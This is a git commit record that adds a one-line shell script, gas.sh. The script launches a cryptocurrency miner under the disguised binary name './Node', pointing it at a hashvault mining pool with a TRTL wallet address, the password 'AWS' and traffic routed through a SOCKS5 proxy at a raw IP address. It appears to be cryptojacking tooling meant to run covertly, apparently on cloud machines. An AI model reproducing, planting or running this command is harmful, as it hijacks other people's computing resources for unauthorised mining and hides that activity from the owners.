361b7f2c2552df4f52db66dc9fade32bed81544a
matthiaskrause1 <88538537+matthiaskrause1@users.noreply.github.com>
2021-08-06 18:04:33 +0700

    Create gas.sh

---
+++ gas.sh
@@ -0,0 +1,1 @@
+./Node --url pool.hashvault.pro:80 --user TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.bc40e6c916b4ed18d4d52fc2f3b6b5f767225a71b557430e73ec9d8d80b4ca13 --pass AWS --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -x socks5://72.195.34.41:4145
